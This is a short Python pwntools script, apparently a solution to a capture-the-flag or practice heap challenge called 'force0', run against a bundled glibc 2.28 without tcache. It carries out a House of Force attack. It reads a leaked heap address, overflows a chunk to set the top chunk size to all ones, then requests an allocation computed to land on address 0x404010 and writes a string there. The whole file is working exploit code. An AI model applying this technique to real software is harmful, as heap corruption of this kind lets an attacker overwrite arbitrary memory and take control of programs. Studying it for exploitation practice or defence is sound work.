from pwn import * 
def fun():
    p=process(["./glibc_2.28_no-tcache/ld.so.2","./force0"],env={'LD_LIBRARY_PATH':'./glibc_2.28_no-tcache/'})
    print(p.recvuntil("@"))
    heap = p.recvuntil("0\n")
    print(heap)
    #heap = heap[13:23]
    heap2 = int(heap,16)
    print(heap2,int(heap[:-1],16))
    p.sendline("1")
    p.sendline("24")
    p.sendline(b"a"*24+p64(0xffffffffffffffff))#b"\xff\xff\xff\xff")
    print(p.recv())
    p.sendline("1")
    target = 0x404010
    evil = target-heap2 -60 # i was wrong on the offset
    print(evil)
    p.sendline(f"{evil}")
    p.sendline("hello")
    print(p.recv())
    p.sendline("1")
    p.sendline("7")
    print(p.recv())
    p.sendline(b"I DID!\x00")
    print(p.recv())
    p.close()
    
    
fun()
